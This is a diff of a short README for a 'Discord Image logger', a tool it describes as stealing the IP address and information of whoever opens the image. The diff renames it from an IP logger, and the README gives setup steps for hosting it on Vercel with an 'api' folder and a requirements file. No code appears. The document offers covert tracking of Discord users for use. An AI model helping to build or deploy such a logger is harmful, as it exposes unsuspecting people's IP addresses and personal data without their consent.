@@ -1,5 +1,5 @@
-# Discord-IP-logger-
-# A simple IP logger that grab steal the ip and info from it
+# Discord-Image-logger-
+# A simple Image logger that steal ip and info from it
 
 For dev this code, You need to host it. Personely I use vercel for this version.
 You need to structure your repository with a folder that you name 'api' a '.gitkeep'  a 'requiremets.txt' and the file.
